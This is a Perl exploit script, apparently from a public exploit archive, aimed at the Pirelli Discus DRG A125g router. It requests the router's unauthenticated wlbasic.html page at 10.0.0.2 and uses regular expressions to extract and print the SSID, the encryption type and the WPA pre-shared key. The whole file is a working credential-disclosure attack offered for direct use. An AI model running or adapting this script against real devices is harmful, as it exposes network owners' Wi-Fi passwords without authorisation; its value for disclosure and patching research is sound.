#!/usr/bin/perl 

#Author: Sebastián Magof

#Hardware: pirelli discus DRG A125g

#Vulnerable file: wlbasic.html

#Bug: Wifi Password Disclosure

#Type: Local

# (\/)

# (**) ±lpha

#(")(")

#usage:perl exploit.pl

use LWP::UserAgent;

use HTTP::Request;

#begin

print "\n\n************************************************************\n";

print "*  Pirelli Discus ADSL DRG A125g Wifi password disclosure  *\n";

print "************************************************************\n\n";



#wifi pwd disclosure file

my $url = "http://10.0.0.2/wlbasic.html";



#UserAgent

my $ua = LWP::UserAgent->new();

$ua->agent("Mozilla/5.0");



#Request.

my $req = HTTP::Request->new(GET => $url);

my $request = $ua->request($req);

my $content = $request->content(); #content

my ($ssi) = $content =~ m/ssid = '(.+)'/;

my ($pwd) = $content =~ m/wpaPskKey = '(.+)'/;

my ($enc) = $content =~ m/var wpa = '(.+)'/;

#ssid+encryption method+pwd;

print "Ssid: $ssi\n";

print "Encryption method: $enc\n";

print "Password: $pwd\n\n";

exit(0);



__EOF__